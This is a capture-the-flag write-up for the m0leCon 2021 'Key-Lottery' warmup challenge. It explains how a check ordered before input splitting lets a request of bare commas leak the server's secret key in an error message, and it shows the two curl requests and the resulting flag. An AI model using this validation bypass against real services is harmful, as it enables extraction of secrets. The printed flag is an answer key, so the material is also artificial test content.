# m0leCon 2021 CTF Teaser - Key-Lottery

## Challenge

Just [guess the correct key](http://key-lottery.challs.m0lecon.it/) an you'll win a flag!

[server.py](server.py)

### Metadata

- Tags: `misc`, `warmup`
- Author: *0000matteo0000*
- Points: 70
- Solves: 116

## Solution

The key is to send in multiple ',' characters and line 49 `...f"got empty key set: {repr(key_set)}"...` should return the `key_set` object as a string, because the check `len(keys) == 0` is before the keys are split up by the ',' characters. After the split, the server checks again `len(keys) > 0` and this is false now.

```bash
> curl 'http://key-lottery.challs.m0lecon.it/guess' \
  --data-raw 'keys=%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C%2C'
got empty key set: {'p1c4XEM2yDQwzCjtYco2tj6toB1A2KXT'}
```

Now we have to upload the received key on the given webpage:

```bash
> curl 'http://key-lottery.challs.m0lecon.it/guess' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'keys=p1c4XEM2yDQwzCjtYco2tj6toB1A2KXT' \
  --insecure
{"p1c4XEM2yDQwzCjtYco2tj6toB1A2KXT":"ptm{u_guessed_it_alright_mate}"}
```

Flag: `ptm{u_guessed_it_alright_mate}`